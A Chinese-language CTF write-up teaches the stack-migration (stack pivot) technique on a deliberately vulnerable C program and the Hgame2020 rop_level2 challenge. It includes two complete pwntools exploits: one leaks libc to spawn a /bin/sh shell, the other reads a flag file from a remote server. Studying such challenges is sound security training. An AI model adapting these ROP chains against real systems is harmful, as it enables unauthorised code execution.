#### 源码
    #include 
    int count = 1337 ;
    char *t= "Z\xc3" ;
    int main(){
    if( count!=1337 ){
        _exit(1);
    }
    count++ ;
    char buf[48];
    setvbuf(stdout,0,2,0);
    puts("Try your best : " );
    read(0, buf,128);
    return ;
    }
`gcc -z relro -z now -fno-stack-protector -mpreferred-stack-boundary=2
migration.c -o migration` 编译命令
#### 简单分析
这个题纯粹就是为了练习的Stack Migration用的，可以不分析代码直接用gdb-peda直接来测试：  
熟悉的栈溢出，但是下面多出来的一些字符串，也是程序不能接受的部分，也可以作为一个需要考虑栈迁移的标志。  
注意一下rsp被覆盖的值。  
计算padding为48.  
计算一下，可以填入多少的可控字段。去除一下刚刚程序不能存入的部分和padding部分，还有80个字节可以用。其中一个来伪造new
esp，剩下也就还有9个gadget可以用，可以给我构造第一个rop链。
#### 图解分析
假设我们已经填入了溢出字符，buf1即为我们要去的新栈，这个选择bss段的后一半：  
开始执行一下leave 中的`mov rsp,rbp`：  
此时rsp 也指向了 rbp指向的位置，在执行leave中的`pop rbp`:  
此时rbp已经到了我们伪造的新栈buf1，然后开始执行ret,进入执行pop_rdi的gadget:  
此时已经将buf1的地址，推入rdi，作为gets的参数，执行gets函数后，我们就可以往buf1上填入我们的rop链，此时栈大小已经没有限制了，可以任意写。  
在这个buf1的栈空间里，我们需要先把rbp指向的位置写入buf2（下一个构造的新栈），然后构造rop链把puts的内存地址给泄露出来，进而可以算出libc的基地址，接着再构造一个gets函数。接着是执行一下leave
的gadget：  
执行完以后就可以发现我们，已经完全控制了栈。并且开了一个buf2的新栈，留着在buf1调用gets函数时来在buf2新栈中摆上调用system(/bin/sh)函数的rop链。然后继续执行：  
这就泄露出了puts函数的内存地址。接着开始往buf2新栈上读rop链:  
读入完成，接着再次执行leave的gadget：  
可以看到esp到了新栈，rbp因为刚刚在buf2填入的buf1，又会到了buf1，这个地址可以随便填了，对做题不影响，填写这个只是可以看到再次栈转移。接着执行buf2新栈的rop链：  
就可以拿到shell了。
### EXP
借着这个思路就可以开始写exp:
    from pwn import *
    import time
    context.arch = 'amd64'
    context.log_level = 'debug'
    e = ELF('./test')
    l = ELF('/lib/x86_64-linux-gnu/libc-2.23.so') 
    # io = remote('127.0.0.1',4000)
    io = process('./test')
    pop_rdi_ret = 0x400703
    pop_rsi_r15_ret= 0x0400701
    pop_rdx_ret= 0x0400724
    leave_ret= 0x0400699
    buf1 = 0x00602000 - 0x200
    buf2 = buf1 + 0x100
    padding = 56 - 8
    puts_plt = e.symbols['puts']
    puts_got = e.got['puts']
    read_add = e.symbols['read']
    io.recvuntil(':')
    p = 'a'*padding + flat([buf1,pop_rdi_ret,0,pop_rsi_r15_ret,buf1,0,pop_rdx_ret,0x100,read_add,leave_ret])
    #raw_input('->')
    io.send(p)
    sleep(0.1)
    p = flat([buf2,pop_rdi_ret,puts_got,puts_plt,pop_rdi_ret,0,pop_rsi_r15_ret,buf2,0,pop_rdx_ret,0x100,read_add,leave_ret])
    sleep(0.1)
    #raw_input('->')
    io.sendline(p)
    io.recvuntil('\n')
    puts = u64((io.recv(6)).ljust(8,'\x00'))
    libc = puts - l.symbols['puts']
    print('libc_base:' + hex(libc))
    binsh_add = l.search('/bin/sh\x00').next() + libc
    #print(binsh_add)
    # raw_input('->')
    system_add = l.symbols['system'] + libc
    p = flat([buf1,pop_rdi_ret,binsh_add,system_add])
    sleep(0.1)
    io.sendline(p)
    io.interactive()
### Hgame2020_week2_rop_level2
#### 查保护和arch
32位程序，开了nx保护
#### ida分析
这个明显的栈溢出，但是0x60-0x50-0x8 =
8。发现只有一个gadget位置，无法构造我们想要的rop链。但是前面的第一个read函数，可以读入很大空间，并且第二个参数buf的地址是固定的。  
那这个题明显就是可以Stack Migration来解决问题了，并且只需再写一个leave ret就控制栈了。
##### 攻击思路
程序中有着open，read，puts函数，我们可以写一个rop链，调用open函数，控制其参数是`./flag`，并在gdb中调试将其返回的文件fd号记录下来，然后传递给read函数，让其读入文件内容存入某个缓冲区，再用puts函数输出一下flag文件的内容即可。在第一个read的时候，我们就需要写好rop链。然后在最后一个read函数时，控制好ebp指向我们的新栈。
#### EXP
    from pwn import *
    context.log_level = 'debug'
    context.arch = 'amd64'
    # io = process('./ROP')
    io = remote('47.103.214.163',20300)
    e = ELF('./ROP')
    buf = 0x06010A0
    # libc = e.libc
    padding = 80
    leave_ret = 0x040090d
    pop_rdi_ret = 0x00400a43
    pop_rsi_r15 = 0x00400a41
    open_plt = 0x4007b0
    read_plt = 0x400780
    puts_plt = 0x400760
    io.recvuntil('think so?\n')
    p = flat(['./flag\x00\x00',pop_rdi_ret,buf,pop_rsi_r15,0,0,open_plt,pop_rdi_ret,4,pop_rsi_r15,buf+0x80,0,read_plt,pop_rdi_ret,buf+0x80,puts_plt])
    io.sendline(p)
    io.recvuntil('\n')
    p = padding * 'a' + p64(buf) + p64(leave_ret)
    raw_input('->') #手动下一个断点，以后让gdb附加上进行调试
    io.send(p)
    flag = io.recvline_contains('hgame')
    print(flag)
    io.interactive()
我们跟着exp来调试一下，看看效果：  
此时的esp是我们伪造的new esp，已经指向了我们的目标位置，并且第一个rop链接已经送过去，可以看到`./flag`的字眼。执行一下leave：  
可以看到rbp的值已经等于我们伪造的值，esp还在原来栈上。接着执行ret，进入下一个leave ret：  
先记录下当前的状态，开始执行leave：  
执行完发现esp已经到达了新栈buf+8的位置，此时的栈帧已经是我们完全想要的，已经劫持了程序流程，并且新栈空间很大，可以满足我们的需求。ebp是多少已经不重要了，我们直接填入`./flag`，这个固定地址也做为给open函数做参数。  
在调试的时候，执行完open函数需要把返回的fd值记录下，给read函数做参数。最后由puts函数在输出flag：  
### Stack Migration小总结
这下可以总结下利用思路也就是
  * 把控好起初栈的ebp，在里面写入需要伪造的new esp
  * 在之后的可利用字节中写入leave gadget
  * 将想执行的ROP Chain写在已知固定位置上
  * 再利用leave搬移Stack位置到已知位置
  * 然后无限接ROP Chain